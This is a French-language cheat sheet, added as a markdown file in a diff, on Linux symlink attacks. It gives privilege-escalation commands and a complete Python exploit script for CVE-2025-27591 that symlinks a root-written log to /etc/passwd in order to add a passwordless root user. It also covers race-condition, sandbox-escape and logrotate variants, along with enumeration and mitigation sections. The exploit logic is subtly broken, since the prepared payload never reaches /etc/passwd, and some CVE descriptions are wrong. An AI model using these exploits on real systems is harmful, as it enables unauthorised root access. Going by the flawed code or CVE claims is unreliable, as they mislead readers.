@@ -1,0 +1,335 @@
+---
+title: Symlink Attack
+date: "2025-01-15"
+draft: false
+---
+
+# 🔗 Symlink Attack - Cheat Sheet
+
+## 🎯 Vue d'ensemble
+Les **attaques par symlink (liens symboliques)** exploitent le mécanisme de redirection des liens symboliques pour :
+- **Escalade de privilèges** : Écrire dans des fichiers protégés
+- **Bypass de restrictions** : Contourner les contrôles d'accès
+- **Race conditions** : Exploiter des fenêtres temporelles
+
+---
+
+## 🔍 Qu'est-ce qu'un Symlink ?
+
+### Définition
+Un **symlink** est un fichier spécial qui pointe vers un autre fichier ou répertoire. Quand un programme interagit avec le symlink, il interagit avec la cible.
+
+```bash
+# Création d'un symlink
+ln -s /chemin/vers/cible /chemin/vers/symlink
+
+# Vérification
+ls -la /chemin/vers/symlink
+# lrwxrwxrwx 1 user user 11 date symlink -> /chemin/vers/cible
+
+# Lecture via symlink
+cat /chemin/vers/symlink  # Lit le contenu de la cible !
+```
+
+### Types de liens
+```bash
+# Lien symbolique (symlink)
+# Pourquoi : Pointe vers un chemin, peut traverser les systèmes de fichiers
+ln -s /target/file /link/to/file
+
+# Lien dur (hard link)
+# Pourquoi : Pointe vers l'inode, même système de fichiers uniquement
+ln /target/file /link/to/file
+```
+
+---
+
+## ⚡ Techniques d'Attaque
+
+### 1. Symlink vers fichier privilégié
+
+#### Scénario
+Un service privilégié écrit dans un fichier sous notre contrôle.
+
+```bash
+# 1. Identifier le fichier cible
+# Pourquoi : Trouver où le service écrit ses données
+ls -la /var/log/service/
+ls -la /tmp/service/
+
+# 2. Vérifier les permissions du répertoire
+# Pourquoi : On doit pouvoir créer/modifier des fichiers
+ls -la /path/to/service/logs/
+# drwxrwxrwx = world-writable → Vulnérable !
+
+# 3. Remplacer le fichier par un symlink
+rm /path/to/service/logfile
+ln -s /etc/passwd /path/to/service/logfile
+
+# 4. Déclencher l'écriture du service
+systemctl restart service
+# ou déclencher une erreur pour forcer l'écriture
+```
+
+#### Payload d'injection
+```bash
+# Injection dans /etc/passwd
+echo "attacker::0:0:,,,:/root:/bin/bash" > /tmp/payload
+
+# Ou injection dans /etc/shadow (si possible)
+echo "attacker:\$6\$salt\$hash:18000:0:99999:7:::" > /tmp/payload
+```
+
+### 2. Exploitation CVE-2025-27591 (Below)
+
+#### Contexte
+Le service "Below" écrit ses logs avec des privilèges root dans un répertoire world-writable.
+
+```bash
+# 1. Vérification de la vulnérabilité
+# Pourquoi : Confirmer que le répertoire est modifiable
+ls -la /var/log/below/
+# drwxrwxrwx 3 root root 4096 below/  ← Vulnérable !
+
+# 2. Identification du fichier cible
+# Pourquoi : Trouver le fichier de log utilisé par le service
+ls -la /var/log/below/
+# error_root.log ← Fichier d'écriture du service root
+
+# 3. Création du symlink malveillant
+rm /var/log/below/error_root.log
+ln -s /etc/passwd /var/log/below/error_root.log
+
+# 4. Préparation du payload
+echo "attacker::0:0:,,,:/root:/bin/bash" > /tmp/attacker
+
+# 5. Déclenchement de l'exploit
+sudo below record  # Force l'écriture dans le log
+```
+
+### 3. Race Condition avec Symlink
+
+#### Technique
+Exploiter une fenêtre temporelle entre vérification et utilisation.
+
+```bash
+# Script d'exploitation de race condition
+#!/bin/bash
+# Pourquoi : Automatiser l'exploitation de la race condition
+
+while true; do
+    # Créer un fichier légitime
+    echo "content" > /tmp/racefile
+    
+    # Rapidement le remplacer par un symlink
+    rm /tmp/racefile 2>/dev/null
+    ln -s /etc/passwd /tmp/racefile 2>/dev/null
+    
+    sleep 0.1
+done
+```
+
+### 4. Bypass de Sandbox
+
+#### Technique
+Utiliser des symlinks pour sortir d'un environnement restreint.
+
+```bash
+# 1. Depuis un répertoire restreint
+# Pourquoi : Accéder à des fichiers en dehors de la sandbox
+pwd
+# /restricted/path
+
+# 2. Créer un symlink vers l'extérieur
+ln -s ../../../../etc/passwd escape
+
+# 3. Accéder au fichier
+cat escape  # Lit /etc/passwd depuis la sandbox !
+```
+
+---
+
+## 🛡️ Détection et Énumération
+
+### Recherche de vulnérabilités
+
+```bash
+# 1. Répertoires world-writable
+# Pourquoi : Identifier où on peut créer des symlinks
+find / -type d -perm -0002 -ls 2>/dev/null
+find / -type d -perm -0777 -ls 2>/dev/null
+
+# 2. Services qui écrivent dans des répertoires modifiables
+# Pourquoi : Trouver les vecteurs d'exploitation
+ps aux | grep root
+lsof | grep -E "(tmp|log)" | grep root
+
+# 3. Fichiers temporaires des services
+# Pourquoi : Identifier les fichiers temporaires exploitables
+ls -la /tmp/ /var/tmp/ /dev/shm/
+find /var/log -type f -perm -0002 2>/dev/null
+```
+
+### Outils d'audit
+
+```bash
+# LinPEAS - Recherche automatisée
+./linpeas.sh | grep -i "writable\|symlink"
+
+# Recherche de symlinks existants
+find / -type l -ls 2>/dev/null | head -20
+
+# Surveillance en temps réel
+# Pourquoi : Observer les créations de fichiers par les services
+inotifywait -m -r /var/log/ /tmp/ --format '%w%f %e'
+```
+
+---
+
+## 🎯 Cas d'Usage Réels
+
+### CVE-2025-27591 - Below Monitoring Tool
+
+**Contexte :** Service de monitoring "Below" avec répertoire world-writable.
+
+```python
+#!/usr/bin/env python3
+# Exploit automatisé pour CVE-2025-27591
+
+import os
+import subprocess
+import time
+
+def exploit_below():
+    log_dir = "/var/log/below"
+    target_log = f"{log_dir}/error_root.log"
+    
+    # 1. Vérifier les permissions
+    if not os.access(log_dir, os.W_OK):
+        print("[-] Répertoire non writable")
+        return False
+    
+    # 2. Supprimer le fichier légitime
+    if os.path.exists(target_log):
+        os.remove(target_log)
+    
+    # 3. Créer le symlink malveillant
+    os.symlink("/etc/passwd", target_log)
+    print(f"[+] Symlink créé: {target_log} -> /etc/passwd")
+    
+    # 4. Préparer le payload
+    with open("/tmp/attacker", "w") as f:
+        f.write("attacker::0:0:,,,:/root:/bin/bash\n")
+    
+    # 5. Déclencher l'écriture
+    subprocess.run(["sudo", "below", "record"], timeout=10)
+    
+    # 6. Vérifier l'injection
+    with open("/etc/passwd", "r") as f:
+        if "attacker" in f.read():
+            print("[+] Payload injecté avec succès !")
+            return True
+    
+    return False
+
+if __name__ == "__main__":
+    exploit_below()
+```
+
+### Exploitation de logrotate
+
+**Contexte :** Exploitation du mécanisme de rotation des logs.
+
+```bash
+# 1. Identifier la configuration logrotate vulnérable
+cat /etc/logrotate.d/vulnerable-service
+# /var/log/service/*.log {
+#     create 644 root root
+# }
+
+# 2. Créer le symlink avant la rotation
+ln -s /etc/passwd /var/log/service/malicious.log
+
+# 3. Attendre la rotation (ou la forcer)
+logrotate -f /etc/logrotate.d/vulnerable-service
+```
+
+---
+
+## 🛡️ Défenses et Mitigations
+
+### Prévention côté système
+
+```bash
+# 1. Restrictions de permissions
+# Pourquoi : Empêcher la création de symlinks malveillants
+chmod 755 /var/log/service/  # Retirer le write pour "others"
+
+# 2. Utilisation de répertoires dédiés
+# Pourquoi : Isoler les écritures des services
+mkdir -p /var/log/service/private
+chown service:service /var/log/service/private
+chmod 700 /var/log/service/private
+```
+
+### Bonnes pratiques de développement
+
+```bash
+# 1. Vérification avant écriture
+# Pourquoi : S'assurer que le fichier n'est pas un symlink
+if [ -L "/path/to/file" ]; then
+    echo "Symlink détecté, arrêt"
+    exit 1
+fi
+
+# 2. Ouverture sécurisée (C/C++)
+// Utiliser O_NOFOLLOW pour éviter de suivre les symlinks
+int fd = open("/path/to/file", O_WRONLY | O_CREAT | O_NOFOLLOW, 0644);
+```
+
+### Surveillance et détection
+
+```bash
+# 1. Monitoring des créations de symlinks
+auditctl -w /var/log -p wa -k symlink_watch
+auditctl -w /tmp -p wa -k symlink_watch
+
+# 2. Détection automatisée
+#!/bin/bash
+# Script de surveillance
+inotifywait -m /var/log/ --format '%w%f %e' | while read file event; do
+    if [ "$event" = "CREATE" ] && [ -L "$file" ]; then
+        echo "ALERT: Symlink créé: $file"
+        ls -la "$file"
+    fi
+done
+```
+
+---
+
+## 📚 Ressources et Références
+
+### CVEs liées aux symlinks
+- **CVE-2025-27591** : Below monitoring tool symlink attack
+- **CVE-2021-3156** : Sudo heap overflow via symlink
+- **CVE-2020-1472** : Zerologon (exploitation indirecte)
+
+### Outils utiles
+```bash
+# Recherche de vulnérabilités symlink
+symlinks -r /  # Vérifier tous les symlinks
+find / -type l -exec ls -la {} \;
+
+# Tests de sécurité
+./pspy64  # Observer les processus en temps réel
+./LinEnum.sh  # Énumération automatisée
+```
+
+### Lectures recommandées
+- [OWASP - Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
+- [Linux Privilege Escalation via Symlinks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#symlinks)
+- [Race Condition Exploitation](https://www.exploit-db.com/papers/13234)
+
+---
+
+*Les attaques par symlink démontrent l'importance de la validation rigoureuse des chemins de fichiers et de la gestion sécurisée des permissions dans les systèmes Unix/Linux.*
